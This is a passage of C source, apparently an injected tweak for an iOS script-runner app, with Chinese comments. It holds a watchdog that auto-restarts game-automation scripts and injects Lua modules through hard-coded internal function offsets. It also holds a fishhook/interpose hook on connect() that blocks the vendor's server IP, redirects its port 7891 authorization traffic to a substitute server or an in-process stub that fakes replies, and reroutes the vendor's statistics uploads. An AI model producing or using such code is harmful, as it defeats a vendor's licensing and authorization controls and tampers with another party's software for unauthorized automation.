                // ★★★ v6.34：用户停止判定统一走 bs_ar_stop_kind —— 与 1->0 判定**同一把尺**。
                //   旧写法 `bs_last_stop_is_user()` 是纯字符串匹配（最后一条 stop 在 run 之后 = 1），
                //   厂商因 `run script error / bs_module_lost` 自己停脚本时它同样返回 1，
                //   于是这里的 `bs_cr_mark_clear()` 会把刚捕获的崩溃证据抹掉 —— 远程再查就只剩
                //   「center/user stop, no auth-fail nearby」，把自动拉起的原因也一起误读了。
                //   kind==2 才有「stop 前无错误签名」这一层约束，是唯一可信的人停判据。
                ar_stop_kind = bs_ar_stop_kind(ap, 262144);
                int us_stop = us_latched || (ar_stop_kind == 2);
                if (us_stop) {
                    // 用户停的：把残留崩溃证据也作废，避免误导后续诊断
                    if (mage >= 0) bs_cr_mark_clear();
                    mage = -1;
                }
                // ★★★ v6.28：agent.log 尾部「最后一条 run/stop 事件是谁的」——60s 一次，
                //   零额外开销（本来就要读这块）。这是「中控下发运行」的第二证据源：
                //   App 刚装完包时 run 标志是 0、sjz 也停摆，只能从日志看中控到底点过什么。
                //   （v6.34：赋值已上移到 us_stop 之前，此处不再重复读盘）
                if (ar_stop_kind == 1 && !ar.armed) {
                    ar.armed = 1; ar.att = 0; ar.gu = 0; ar.next = 0;
                    ar.hard = 0; ar.hv = 0; ar.vfy = 0; ar.up = 0;   // v6.31：日志证据=解除硬失败
                    bs_ar_write(&ar, "run-log");
                    bs_evt("[ar] armed (agent.log: last event = begin run script)");
                } else if (ar_stop_kind == 2) {
                    // ★★★★ v6.40（断网事故根因点①）：这条 stop 极可能是**我们自己**
                    //   killswitch 发的。OPER_STOP 走 `FN_SET_OPER(OPER_STOP)` 直接调 App
                    //   内部函数，不经中控消息通道 → agent.log 只留厂商执行的
                    //   `agent stop script`，形态与人工点停止完全一样，kind 判不出区别。
                    //   判据：kill 过 + 可恢复 + 落在自我窗口内 → 自己人，绝不能 disarm。
                    //   ★ 时间窗不可省：g_kill_resumable 置 1 后永不主动清零。
                    long kage = g_kill_ts ? (long)nowt4 - g_kill_ts : -1;
                    if (g_kill_sent && g_kill_resumable && kage >= 0 &&
                        kage <= AR_KILL_SELF_WIN) {
                        bs_evt("[ar] stop evidence = OUR killswitch (%lds ago, resumable) "
                               "-> skip disarm (keep armed=%d lst=%d)", kage, ar.armed, ar.lst);
                    } else if (ar.armed || ar.lst) {
                        // ★ 严格版：中控（或用户在 App 里）下发停止 → 两个凭据都清，
                        //   之后无论脚本停多久、重启多少次，都不许自动接上。
                        ar.armed = 0; ar.lst = 0; ar.att = 0; ar.gu = 0; ar.next = 0;
                    ar.hold = time(NULL);   // 记录停止时刻，挡住 st 滞后带来的重武装
                        bs_ar_write(&ar, "stop-log");
                        bs_evt("[ar] disarmed (agent.log: center/user stop, no auth-fail nearby) "
                               "-> auto-resume OFF until next Run");
                    }
                } else if (ar_stop_kind == 6) {
                    // ★★★★ v6.40（断网事故根因点②）：stop 前 4KB 有网络故障签名，
                    //   且无 operate 前缀、无错误签名 → 归属不明但确定不是人点的
                    //   （典型：killswitch 发停 + 厂商 agent 恰好在此刻重连授权服失败）。
                    //   按 self-stop 处理：**不动 armed/lst**，等心跳恢复后 [ar] 自己接上。
                    bs_evt("[ar] stop evidence = network failure (kind=6) -> treat as self-stop, "
                           "keep armed=%d lst=%d", ar.armed, ar.lst);
                } else if (ar_stop_kind == 3) {
                    // 厂商杀脚本（授权坏了）：不是「自己空转」，拉了也会被杀 → 清 lst + 冷却。
                    ar_vendor_ts = nowt4;
                    if (ar.lst) {
                        ar.lst = 0; ar.hold = nowt4;
                        bs_ar_write(&ar, "vendor-stop");
                    }
                    bs_evt("[ar] vendor stop detected (stop + recv auth failed) -> hold %ds",
                           AR_VENDOR_COOL);
                }
                // 每 5 分钟一条诊断快照（不动作），便于下次远程定位卡点
                static time_t stlog = 0;
                if (nowt4 - stlog >= 300) {
                    stlog = nowt4;
                    // ★ v6.24r：带上运行库生效状态。so=盘上 md5 前 8 位，pend=1 表示
                    //   「盘上新的、内存旧的，还差一次手动运行」。这样远程一眼分得清
                    //   三种停摆：盘上旧的坏包 / 盘上新包但没重启脚本 / 新包已生效还停。
                    char smd5[40] = {0};
                    long ssz = -1, sap = 0, sdk = 0;
                    int  spend = -1;
                    if (!bs_so_state_read(smd5, sizeof(smd5), &ssz, &spend, &sap, &sdk))
                        snprintf(smd5, sizeof(smd5), "unknown");
                    bs_evt("[cr] stall scan: run=%u st=%p hb=%d rage=%ld mark=%ld sjz=%ld us=%d "
                           "so=%.8s pend=%d size=%ld ar=%d/%d/%d lst=%d",
                           (unsigned)run, (void *)st, g_hb_ok, rage, mage, sjz_age, us_stop,
                           smd5, spend, ssz, ar.armed, ar.att, ar_stop_kind, ar.lst);

                    // ★ v6.29：pend 长期不收敛提醒 —— 「新包在盘上，但脚本一直没重启，
                    //   内存里还是旧包」。旧包修不了新 bug，而远程只看 pend=1 无法判断
                    //   它挂了多久。这里落盘时长 >24h 就发一条醒目事件（每次落盘只报一次）。
                    if (spend == 1 && sdk > 0) {
                        static long pend_warn_disk = 0;
                        long hung = (long)nowt4 - sdk;
                        if (hung >= 86400 && pend_warn_disk != sdk) {
                            pend_warn_disk = sdk;
                            bs_evt("[so] ★★ pend=1 for %ldh (so=%.8s on disk, MEMORY still old) "
                                   "-> needs ONE script restart to take effect", hung / 3600, smd5);
                        }
                    }
                }
            }
        }

        // ================================================================
        // ★★★ v6.28 严格版：[ar] 只接「运行中 → 自己停」（纯设备端，中控零参与）
        // ================================================================
        //   唯一判据：ar.armed && ar.lst && st==0
        //     ar.lst=1  = 上次确实看到 st!=0（脚本容器真在跑，已落盘，重启后仍记得）
        //     st==0     = 现在容器没了（自己崩了 / 被杀 / App 重启后没起来）
        //   ★ 不接的三种：
        //     ① 中控/用户下发停止 → lst 已被清 0，这里外层就进不来
        //     ② 我们自己 killswitch → lst 已清 0
        //     ③ 从来没跑起来（点了运行但 st 一直 0，lst 从未置 1）→ 不拉，拉了也起不来
        //   ★ run==1 但 st==0 超过 AR_STUCK_SECS 也认（装包后 run 标志残留 1 的情况）。
        //   ★ v6.31：把 g_crashresume 接回真闸门 —— 写 crashresume=0 才是真的「原地等人点运行」。
        //     （v6.28 把旧 5 个入口换成 [ar] 时漏了这个条件，导致该开关空转了一整版。）
        //     注意：postinst 的 conf_set 会强制写 1，历史现场被手改成 0 的机器装包后自动恢复；
        //     想让某台机器不自动拉起，装包后再改文件（此处只读，不覆盖现场）。
        if (g_mode == MODE_UNLOCK && ar.armed && ar.lst && g_crashresume) {
            time_t nowa  = time(NULL);
            long   a_sja = bs_file_age(DATA_DIR "/log/sjz.log");

            // --- 跑稳计数：拉起/手动跑起来后连续 st!=0 && run=1 满 AR_OK_STABLE 才算真恢复 ---
            if (run && st != 0) {
                if (!ar_ok) ar_ok = nowa;
                if (nowa - ar_ok >= AR_OK_STABLE && (ar.att || ar.gu || ar.hard || ar.hv)) {
                    ar.att = 0; ar.gu = 0; ar.next = 0;
                    ar.hard = 0; ar.hv = 0; ar.vfy = 0; ar.up = 0;   // v6.31：真跑稳=全部清零
                    bs_ar_write(&ar, "stable");
                    bs_evt("[ar] stable %ds -> failure counter reset", (int)(nowa - ar_ok));
                }
            } else {
                ar_ok = 0;
            }
            // --- st==0 持续计时（只用于「run 标志残留 1」这一种兜底）---
            if (st == 0) {
                if (!ar_notrun) ar_notrun = nowa;
            } else {
                ar_notrun = 0;
            }

            // --- ★★★ v6.31：resume 回执 —— 点了一次到底起没起来 ---
            //   窗口内看到 st!=0 = 点着了（ar.up=1；hard 计数等跑满 AR_OK_STABLE 才清）；
            //   窗口到期仍 st==0 = 点了没反应 → 分类 + 对症动作 + 计数。
            if (ar.vfy) {
                if (st != 0) {
                    ar.up = 1;
                    ar.vfy = 0;
                    bs_evt("[ar] resume#%d verified (st!=0) -> started", ar.att);
                } else if (nowa >= ar.vfy) {
                    ar.vfy = 0;
                    char sig[24];
                    int  cls = ar_fail_class(sig, sizeof(sig), ar_sjz_mark, ar_ag_mark);
                    long dsz = ar_sjz_mark >= 0 ? bs_file_size(DATA_DIR "/log/sjz.log")   - ar_sjz_mark : -1;
                    long dga = ar_ag_mark  >= 0 ? bs_file_size(DATA_DIR "/log/agent.log") - ar_ag_mark  : -1;
                    bs_evt("[ar] ★ resume#%d NOT started in %ds (sig=%s cls=%d sjz+%ldB agent+%ldB)",
                           ar.att, AR_VERIFY_SECS, sig, cls, dsz, dga);
                    if (cls == AR_CLS_FG) {
                        // 环境问题：游戏被顶到后台 → 拉回前台，下一拍立刻重试一次（不吃退避档）
                        bs_evt("[ar] cls=fg -> uiopen %s then retry immediately", FG_GAME_BID);
                        char *uo[] = { (char *)"/usr/bin/uiopen", (char *)"--bundleid",
                                       (char *)FG_GAME_BID, NULL };
                        bs_spawnv("/usr/bin/uiopen", uo);
                        fg_last = nowa;
                        ar.next = 0;
                        bs_ar_write(&ar, "verify-fg");
                    } else if (cls == AR_CLS_MODULE) {
                        // 模块/容器缺失：重复点运行无效，puller 每 g_tick 自己会补回来。
                        //   → 不增 hard 计数，只把下次重试推到 5 分钟后，别把退避档位烧光。
                        bs_evt("[ar] cls=module -> wait puller (next=+300s, no hard-fail)");
                        ar.next = nowa + 300;
                        bs_ar_write(&ar, "verify-module");
                    } else {
                        // config / auth / unknown：点多少次都是同一结果 → 计数，够了就静默
                        ar.hard++;
                        if (cls == AR_CLS_CONFIG || cls == AR_CLS_AUTH) ar.hard = AR_HARD_N;
                        if (ar.hard >= AR_HARD_N) {
                            ar.hv = nowa; ar.gu = 1; ar.gts = nowa;
                            bs_ar_write(&ar, "hard-fail");
                            bs_evt("[ar] ★★ HARD FAIL att=%d sig=%s cls=%d hard=%d "
                                   "-> silent %ds (needs human / new pack)",
                                   ar.att, sig, cls, ar.hard, AR_HARD_HOLD);
                        } else {
                            bs_ar_write(&ar, "verify-fail");
                            bs_evt("[ar] hard=%d/%d -> keep retrying", ar.hard, AR_HARD_N);
                        }
                    }
                    // 分类基线推到当前末尾：下一次判定只看再往后的新增字节
                    ar_sjz_mark = bs_file_size(DATA_DIR "/log/sjz.log");
                    ar_ag_mark  = bs_file_size(DATA_DIR "/log/agent.log");
                }
            }

            // --- ★ v6.31：硬失败到期 → 自动重开一轮（否则 hv 会永久挡住，等于设备躺平）---
            if (ar.hv && nowa - ar.hv >= AR_HARD_HOLD) {
                ar.hv = 0; ar.hard = 0; ar.gu = 0; ar.att = 0; ar.next = 0;
                bs_evt("[ar] hard-fail window over -> new round (manual check advised)");
                bs_ar_write(&ar, "hard-expired");
            }

            int want = 0;
            const char *why = NULL;
            // 启动静默期：躲 App 初始化 / 装包后重建 / bootstrap 铺密钥
            if (nowa - ar_t0 >= AR_BOOT_GRACE && st == 0) {
                if (run == 0) {
                    want = 1;
                    why = ar_cr_hit ? "crash" : "self-stop";
                } else if (ar_notrun && nowa - ar_notrun >= AR_STUCK_SECS) {
                    // run 标志还在、容器却一直不存在 → 同样是「跑着跑着没了」，兜底接一次
                    want = 1; why = "stuck-run1";
                }
            }

            // --- 抑制矩阵 ---
            const char *hold = NULL;
            if (want) {
                if (g_card_blocked) {
                    want = 0; hold = "card-blocked";
                } else if (!g_hb_ok) {
                    // ★ v6.39：网络类 kill 之后 puller 发现心跳恢复即置 g_hb_ok=1，
                    //   [ar] 下一拍就能接上（最坏 AR_KILL_COOL_NET=90s）。
                    //   删掉这条就等于「断网恢复后必须人工点运行」，这就是事故本体。
                    want = 0; hold = "hb-not-ok";
                } else if (us_latched || bs_us_mark_exists()) {
                    want = 0; hold = "user-stop";
                } else if (ar_stop_kind == 2) {
                    // ★★★★ v6.40：先认自己人。网络类 kill 发的 OPER_STOP 在 agent.log
                    //   里就是一条裸 `agent stop script`，与本矩阵里的 "center-stop"
                    //   完全同形 —— 旧版因此把「我们自己的停」当成「人停」，网络恢复后
                    //   永远 want=0。判据同上：kill 过 + 可恢复 + 自我窗口内。
                    //   命中时**不在这里拦**，往下落到 kill-cool-net 的节奏控制即可。
                    long kage3 = g_kill_ts ? (long)nowa - g_kill_ts : -1;
                    if (g_kill_sent && g_kill_resumable && kage3 >= 0 &&
                        kage3 <= AR_KILL_SELF_WIN) {
                        bs_evt("[ar] matrix: center-stop is OUR killswitch (%lds ago) "
                               "-> not blocking", kage3);
                    } else {
                        want = 0; hold = "center-stop";
                    }
                } else if (g_kill_sent && nowa - g_kill_ts <
                           (g_kill_resumable ? AR_KILL_COOL_NET : AR_KILL_COOL)) {
                    // ★ v6.39：网络失联的 kill 冷却只留一个 tick（AR_KILL_COOL_NET），
                    //   否则「保留模块」也白搭 —— 还得再等 10 分钟才肯接。封禁才吃满 600s。
                    want = 0; hold = g_kill_resumable ? "kill-cool-net" : "kill-cool";
                } else if (ar_vendor_ts && nowa - ar_vendor_ts < AR_VENDOR_COOL) {
                    want = 0; hold = "vendor-cool";
                } else if (ar.hv && nowa - ar.hv < AR_HARD_HOLD) {
                    want = 0; hold = "hard-fail";
                } else if (ar.gu) {
                    if (nowa - ar.gts > AR_GIVEUP_HOLD) {
                        ar.gu = 0; ar.att = 0; ar.next = 0;
                        bs_evt("[ar] giveup window over -> new retry round");
                    } else {
                        want = 0; hold = "giveup";
                    }
                }
                // ★★★ v6.32：发 OPER_START 之前**实时**复查一次 agent.log。
                //   ar_stop_kind 是 60 秒扫描块的缓存值，中控刚点完停止的那一分钟里它还是旧值
                //   （=0/1），正好是误拉起的窗口 —— 216 的 14:58:08 就发生在这个窗口里。
                //   这一步只在「本来就要拉起」时才读日志（极低频），开销可忽略。
                if (want) {
                    int sk_live = bs_ar_stop_kind(DATA_DIR "/log/agent.log", 262144);
                    // ★★★★ v6.40：这里是**最狠的一处**（断网事故的第三道封锁）。
                    //   网络恢复后 [ar] 想接，实时复查看到残留的那条 `agent stop script`
                    //   就清 lst + 写 .bs_userstop + us_latched=1 —— 这不是"下次再试"，
                    //   是**永久闸门**（只有中控再点运行才解），比 6040 的 disarm 更绝。
                    //   ★ 那条 stop 是我们在 90~900 秒前自己发的，永远不会从日志里消失
                    //     （窗口按 256KB 滚，除非日志翻页），所以只能靠自我窗口认领。
                    long kage4 = g_kill_ts ? (long)nowa - g_kill_ts : -1;
                    int ours = (g_kill_sent && g_kill_resumable && kage4 >= 0 &&
                                kage4 <= AR_KILL_SELF_WIN);
                    if (sk_live == 2 && ours) {
                        bs_evt("[ar] live check: center/user stop is OUR killswitch "
                               "(%lds ago, resumable) -> NOT gating, proceed", kage4);
                    } else if (sk_live == 2) {
                        want = 0; hold = "center-stop-live";
                        ar_stop_kind = 2;
                        if (ar.armed || ar.lst) {
                            ar.armed = 0; ar.lst = 0; ar.att = 0; ar.gu = 0; ar.next = 0;
                            ar.hold = nowa;
                            bs_ar_write(&ar, "stop-log-live");
                        }
                        bs_us_mark_write("run 1->0 (live)");
                        us_latched = 1;
                        bs_evt("[ar] ★ resume BLOCKED: live agent.log says center/user stop "
                               "(why=%s att=%d) -> gate set, no OPER_START", why, ar.att);
                    }
                }
                if (want && ar.next && nowa < ar.next) {
                    want = 0; hold = "backoff";
                }
            }

            if (want) {
                ar.att++;
                ar.last = nowa;
                // ★★★ v6.31：开回执窗口 + 记分类基线（分类只看本次 resume 之后新增的日志字节）
                ar.vfy = nowa + AR_VERIFY_SECS;
                ar.up  = 0;
                ar_sjz_mark = bs_file_size(DATA_DIR "/log/sjz.log");
                ar_ag_mark  = bs_file_size(DATA_DIR "/log/agent.log");
                int bi = ar.att - 1;
                if (bi >= AR_GIVEUP_N) bi = AR_GIVEUP_N - 1;
                ar.next = nowa + AR_BACKOFF[bi];
                if (ar.att >= AR_GIVEUP_N) { ar.gu = 1; ar.gts = nowa; }
                bs_ar_write(&ar, why);
                bs_evt("[ar] ★ resume #%d (%s) run=%u st=%p hb=%d sjz=%ld next=+%ds%s -> OPER_START",
                       ar.att, why, (unsigned)run, (void *)st, g_hb_ok, a_sja,
                       AR_BACKOFF[bi], ar.gu ? " GIVEUP-AFTER-THIS" : "");
                // ★★★ v6.34：resume 前的模块自检（纯诊断，不阻断）。
                //   模块目录空 + 拉起的运行 = 必然 `bs_module_lost`（脚本 require 不到），
                //   厂商会再停一次，只能等 puller 把模块铺回来靠下一轮退避重试。
                //   记一行事件，远程一眼看出「这一次注定白拉」，不用再猜 4 小时。
                int pre_n = bs_count_local_modules();
                if (pre_n <= 0) {
                    bs_evt("[ar] ★ resume precheck: 0 local module(s) at %s "
                           "-> puller must re-lay, expect one bs_module_lost retry", g_mod_dir);
                } else if (pre_n != mod_last_n) {
                    // ★ v6.36：盘上模块数与上次注入数不一致 —— 拉起后 st 一出现，
                    //   下面的 [mod] resync 会在 10s 内补注，不必再白等一个 300s 周期。
                    bs_evt("[ar] ★ resume precheck: disk=%d last-injected=%d "
                           "-> resync will re-inject once state appears (v6.36)",
                           pre_n, mod_last_n);
                }
                ((void (*)(int))(base + FN_SET_OPER))(OPER_START);
                bs_cr_mark_clear();
                ar_cr_hit = 0;
                ar_notrun = 0;
            } else if (hold) {
                static time_t hold_log = 0;
                if (nowa - hold_log >= 300) {
                    hold_log = nowa;
                    bs_evt("[ar] hold=%s att=%d run=%u st=%p hb=%d sjz=%ld stop=%d",
                           hold, ar.att, (unsigned)run, (void *)st, g_hb_ok, a_sja, ar_stop_kind);
                }
            }
        }

        // --- ★ v6.24b：崩溃恢复重试状态机 —— ★ v6.24p 删除，v6.28 由 [ar] 接管 ---
        //   （旧机型的无脑 OPER_START / 会话死升级冷启 App 全部不再使用；
        //     现在的自动运行只走上面的 [ar]，条件=armed + 无主动停止证据 + 抑制矩阵放行。）

        // --- ★ v6.24d：[fg] 游戏前台看门狗 ---
        //   脚本活着（run=1）但游戏被顶到后台：sjz.log 停摆 ≥ FG_STALE_SECS
        //   且尾部最后留下的是 "game is not front app"（10-18 .216 实锤断流形态）。
        //   双条件缺一不可 —— 只看 sjz 停摆就是 v6.23z 被否的静默看门狗（休眠误判），
        //   必须同时命中前台签名才动作。uiopen 游戏拉回前台，FG_MIN 限速。
        //   probe 模式（真卡机）零动作。
        if (g_mode == MODE_UNLOCK && run && saw_run) {
            time_t nowt3 = time(NULL);
            if (nowt3 - fg_last >= FG_MIN) {
                char sp[300];
                snprintf(sp, sizeof(sp), "%s/log/sjz.log", DATA_DIR);
                struct stat sb2;
                if (stat(sp, &sb2) == 0
                    && nowt3 - (time_t)sb2.st_mtime >= FG_STALE_SECS
                    && bs_tail_count(sp, 1024, "game is not front app") > 0) {
                    fg_last = nowt3;
                    bs_log("[fg] sjz stale %ds + game-not-front signature -> uiopen %s",
                           (int)(nowt3 - (time_t)sb2.st_mtime), FG_GAME_BID);
                    char *uo[] = { (char *)"/usr/bin/uiopen", (char *)"--bundleid",
                                   (char *)FG_GAME_BID, NULL };
                    bs_spawnv("/usr/bin/uiopen", uo);
                }
            }
        }

        // --- v5.4：puller 拉到新模块后只置位，实际注入在这里做 ---
        //     puller 是裸 pthread，而 bs_inject_modules 要调 Agent 内部函数、
        //     造 NSString/NSData、写 NSMutableDictionary —— 这些都必须躲开
        //     puller 线程（凡是会在裸线程上触发 runtime 懒加载的都得小心）。
        //     watchdog 线程虽然也是裸 pthread，但它在 state 就绪后(下面分支)
        //     才注入，此刻 runtime 早已被产品自己初始化完毕，实测安全。
        if (g_need_inject) {
            g_need_inject = 0;
            if (g_card_blocked) {
                // ★ v6.20：卡密封禁 → 拒绝注入（[card] BLOCKED 已打日志）
                bs_log("[wd] need_inject skipped (card blocked)");
            } else {
            bs_log("[wd] need_inject set -> inject now (st=%p)", (void *)st);
            if (st != 0) {
                mod_last_n = bs_inject_modules(base);
                bs_log("[wd] need_inject done n=%d", mod_last_n);
            } else {
                bs_log("[wd] need_inject but st==0, defer");
                g_need_inject = 1;      // 还没到能注入的时机，留给下一轮
            }
            }
        }

        // --- v4.1：state 出现 且 字典对象换过 → 重灌本地模块 ---
        if (st != 0) {
            void *dict = *(void **)(base + OFF_ONION_DICT);
            if (dict != last_dict || st != last_state) {
                bs_log("[wd] state change st=%p dict=%p -> inject", (void *)st, dict);
                last_state = st;
                last_dict  = dict;
                if (g_card_blocked) {
                    // ★ v6.20：卡密封禁 → 拒绝重灌模块
                    bs_log("[wd] inject skipped (card blocked)");
                } else {
                    mod_last_n = bs_inject_modules(base);
                    bs_log("[wd] inject returned n=%d", mod_last_n);
                }
                continue;               // 本轮不参与僵死判定
            }
        } else {
            last_state = (uint64_t)-1;
            last_dict  = NULL;
        }

        // --- ★★★ v6.36：模块盘面同步（「注入之后」盘上才补回模块的场合） ---
        //   216 实证（2026-10-22 21:05:26）：resume 后 state change 注入时盘上只有 2 个
        //   lua（task_lhdb_into 正被改成 .missing），注入 n=2；1 秒后真模块被 cp 回来，
        //   但 dict / st 指针都没再变 → 上面那个分支永远不会再进 → 脚本缺模块白卡
        //   302 秒才崩，崩完第二次 resume 才拿到 n=3。puller 补模块同理。
        //   这里每 MOD_SYNC_SECS 比对一次「盘上 .lua 个数」与「上次注入条数」，
        //   盘面数字一变就补注一次；mod_try_n 记住试过的盘面，防止同一状态反复刷日志。
        //   只在 st 就绪时做 —— st==0 时字典还没建，bs_inject_modules 拿不到槽位。
        if (st != 0 && !g_card_blocked) {
            time_t nows = time(NULL);
            // mod_sync_at==0 表示「本进程还没同步过」—— 首拍必须放行，
            // 否则设备时钟异常（nows 很小）时会永远卡在限速分支里。
            if (mod_sync_at == 0 || nows - mod_sync_at >= MOD_SYNC_SECS) {
                // nows 可能是 0（时钟未同步），写成 0 会让下一拍又走「首拍放行」，
                // 退化成每拍 opendir —— 记 1 把它变成正常时间戳。
                mod_sync_at = nows ? nows : 1;
                int cur = bs_count_local_modules();
                if (cur != mod_last_n && cur != mod_try_n) {
                    mod_try_n = cur;
                    bs_log("[mod] resync: disk=%d last=%d -> re-inject", cur, mod_last_n);
                    mod_last_n = bs_inject_modules(base);
                    bs_log("[mod] resync done n=%d", mod_last_n);
                }
            }
        }

        // --- v3：僵死态自愈 ---
        // ★ v6.7：重启期间跳过僵死判定 —— ★ v6.24q：原 g_reload_busy 跳过随 [rl] 移除

        if (st == 0 || run != 0) {  // 正常态：无 state 或脚本正在跑
            stale = 0;
            continue;
        }

        if (++stale < WD_STALE_TICKS) continue;
        stale = 0;

        int rs = *(volatile int *)(base + OFF_RS_1A8);
        bs_evt("[wd] stale state=%p run=%u rs=%d -> request STOP",
               (void *)st, (unsigned)run, rs);

        ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);

        sleep(4);
        uint64_t after = *stp;
        if (after == 0) {
            bs_log("[wd] stale state cleared OK");
        } else {
            bs_log("[wd] state still %p after stop request", (void *)after);
        }
    }
    return NULL;
}

// ---------------------------------------------------------------- 主流程
// ================================================================
// ★★★ v6.19：厂商服务器进程内屏蔽（fishhook，仅 unlock 模式）
// ================================================================

static int (*g_orig_connect)(int, const struct sockaddr *, socklen_t);
static int (*g_orig_getaddrinfo)(const char *, const char *,
                                 const struct addrinfo *, struct addrinfo **);
// ★ v6.21：运行时闸门 —— __interpose 节由 dyld 装载时无条件生效，probe
//（真卡机）/ blockvps=0 必须全放行，故屏蔽逻辑以 g_blk_active 为准。
//   ★ v6.24s：变量本体已上移到 g_blk_installed 旁（bs_load_conf 要同步它）。

/// 解析真身：fishhook 填过就用；否则 RTLD_NEXT 跳过本镜像取 libsystem 真身。
/// （不能 RTLD_DEFAULT —— interpose 生效时会解析到替身自身 → 无限递归。）
static void *bs_orig_fn(const char *name, void **slot) {
    if (*slot) return *slot;
    void *p = dlsym(RTLD_NEXT, name);
    if (p) *slot = p;
    return p;
}

/// connect 替身：目标 = 厂商 IP（43.154.19.236）→ EHOSTUNREACH。
/// 其余连接（我们云端 / 中控 PC / 60.204 / relay）全部原样放行。
static int bs_hook_connect(int fd, const struct sockaddr *addr, socklen_t len) {
    (void)len;
    if (!bs_orig_fn("connect", (void **)&g_orig_connect))
        { errno = ENOSYS; return -1; }

    // ★★★★ v6.25i：offline=1 走一条独立的出站路径，放在所有现有分支之前。
    //   这样它不受 s2 / blockvps / 端口枚举的影响 —— 顺带堵掉两个已知隐患：
    //     · 给离线机下发 s2 不再能把流量放出去（旧顺序里改道分支在桩分支之前）；
    //     · agent.dat 缺失或指向未知 IP 时，7891 照样接桩（厂商看到的仍是「连上了」，
    //       不会因为连不上而清缓存，不会陷入「越修越坏」的循环）。
    //   顺序：白名单放行 → 统计端口改道中控 → 7891 接桩 → 其余拒绝。
    if (g_offline && g_off_egress && addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        int      port;
        uint32_t nip;
        uint32_t vp;
        memcpy(&a, addr, sizeof(a));
        port = (int)ntohs(a.sin_port);
        nip  = a.sin_addr.s_addr;
        if (!g_off_vendor_net) g_off_vendor_net = inet_addr(STAT_VENDOR_IP);
        if (off_egress_ok(nip))
            return g_orig_connect(fd, addr, len);       // ① 中控 / 云端 / 回环
        // ② 统计上报（7875 统计 / 7880 照片）：改道到中控，能力保留、零外发。
        vp = g_stat_vp_net ? g_stat_vp_net : g_off_vendor_net;
        if (nip == vp && (port == 7875 || port == 7880)) {
            uint32_t pc = off_allow_pc_net();
            if (pc) {
                a.sin_addr.s_addr = pc;
                bs_log("[off] stat %s:%d -> %s (allowlisted pc)",
                       off_ip_str(nip), port, off_ip_str(pc));
                return g_orig_connect(fd, (struct sockaddr *)&a, sizeof(a));
            }
            off_deny(nip, port, 0);                     // 没配中控 → 只能拒
            errno = EHOSTUNREACH;
            return -1;
        }
        // ③ server2：协议里只有 7891 这个端口，不分 IP 一律接桩，一个字节都不出去。
        if (port == S2_DEF_PORT) {
            off_start(fd);
            bs_log("[off] connect %s:%d intercepted -> in-proc stub",
                   off_ip_str(nip), port);
            return 0;
        }
        // ④ 其余全部拒绝
        off_deny(nip, port, 0);
        errno = EHOSTUNREACH;
        return -1;
    }

    // ★ v6.23l/v6.23m：统计上报改道 —— 只命中厂商统计 IP:7875/7880，其它连接零感知。
    //   目标解析：① conf statip= 优先；② 未配置 → 现读 app.plist 中控 ip
    //   （用户拍板：中控与统计网站都是 app.plist 那台电脑，端口不变）。
    //   放在 g_blk_active 闸门之前：probe（真卡机）同样生效。
    if (addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_stat_vp_net) {
            int port = (int)ntohs(a.sin_port);
            if (port == 7875 || port == 7880) {
                uint32_t net = g_stat_ip_net;      // ① conf statip=
                const char *dst = g_stat_ip;
                const char *src = "conf";
                char appip[64]; appip[0] = 0;
                if (!net) {                        // ② v6.23m：现读 app.plist
                    bs_pc_ip_of_plist(appip, sizeof(appip));
                    if (appip[0]) {
                        uint32_t n2 = inet_addr(appip);
                        if (n2 != INADDR_NONE && n2 != 0) {
                            net = n2; dst = appip; src = "app.plist";
                        }
                    }
                }
                if (net) {
                    a.sin_addr.s_addr = net;
                    long n = ++g_stat_n_redir;
                    if (n <= 5 || n % 60 == 1)
                        bs_log("[stat] connect " STAT_VENDOR_IP ":%d -> %s (%s) (#%ld)",
                               port, dst, src, n);
                    return g_orig_connect(fd, (struct sockaddr *)&a, sizeof(a));
                }
                // ①② 均无有效目标 → 原样放行（历史行为，落厂商）
            }
            // ★ v6.24s：server2（授权 7891）改道 —— 中控下发了 s2 就改，没下发就原样放行。
            //   放在 stat 分支同一段（g_blk_active 闸门之前）：probe 模式同样生效。
            else if (port == S2_DEF_PORT && g_s2_net &&
                     g_s2_net != a.sin_addr.s_addr) {
                a.sin_addr.s_addr = g_s2_net;
                a.sin_port        = htons((uint16_t)g_s2_port);
                long n = ++g_s2_n;
                if (n <= 5 || n % 60 == 1)
                    bs_log("[s2] connect " STAT_VENDOR_IP ":%d -> %s:%d (%s) (#%ld)",
                           port, g_s2_ip, g_s2_port, g_s2_src, n);
                return g_orig_connect(fd, (struct sockaddr *)&a, sizeof(a));
            }
            // ★★★★ v6.25：真离线 —— offline=1 且没有 s2 改道时，直接把这条连接
            //   标成"已连上"并交给 send/recv 伪造应答。一个字节都不出去。
            else if (port == S2_DEF_PORT && !g_s2_net && g_offline) {
                off_start(fd);
                bs_log("[off] connect " STAT_VENDOR_IP ":%d intercepted -> in-proc stub",
                       port);
                return 0;
            }
        }
    }
    // ★ v6.25：旧厂商地址 43.154.19.236:7891 同样接管（offline 时）
    if (g_offline && addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_vps_ip_net &&
            (int)ntohs(a.sin_port) == S2_DEF_PORT && !g_s2_net) {
            off_start(fd);
            bs_log("[off] connect " VPS_IP_STR ":%d intercepted -> in-proc stub",
                   S2_DEF_PORT);
            return 0;
        }
    }
    // ★ v6.24s：43.154.19.236:7891（旧厂商地址，业务端口已不可用）在 s2 有效时
    //   同样改道。放在 g_blk_active 闸门之前 —— blockvps=0 时也能救回来。
    if (addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_vps_ip_net &&
            (int)ntohs(a.sin_port) == S2_DEF_PORT &&
            g_s2_net && g_s2_net != a.sin_addr.s_addr) {
            a.sin_addr.s_addr = g_s2_net;
            a.sin_port        = htons((uint16_t)g_s2_port);
            long n = ++g_s2_n;
            if (n <= 5 || n % 60 == 1)
                bs_log("[s2] connect " VPS_IP_STR ":%d -> %s:%d (%s) (#%ld)",
                       S2_DEF_PORT, g_s2_ip, g_s2_port, g_s2_src, n);
            return g_orig_connect(fd, (struct sockaddr *)&a, sizeof(a));
        }
    }
    if (!g_blk_active)
        return g_orig_connect(fd, addr, len);
    if (addr && addr->sa_family == AF_INET) {
        struct sockaddr_in a;
